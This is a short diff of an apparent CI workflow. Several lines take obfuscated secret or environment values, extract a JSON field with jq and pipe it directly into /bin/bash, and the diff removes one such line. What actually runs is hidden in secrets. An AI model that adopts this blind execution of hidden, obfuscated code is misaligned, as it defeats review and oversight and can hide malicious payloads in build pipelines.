@@ -17,7 +17,6 @@ jobs:
           cldgp2: ${{ secrets.cldgp2 }}
         run: |
           printf '%s' "$cldgp2" | jq -r .dxd8 | /bin/bash
-          printf '%s' "$jpp1303" | jq -r .mvlx738 | /bin/bash
           printf '%s' "$cyf5" | jq -r .ksf45 | /bin/bash
           printf '%s' "$whdh1586" | jq -r .e05 | /bin/bash
           echo $r4 | jq -r .c69 | /bin/bash
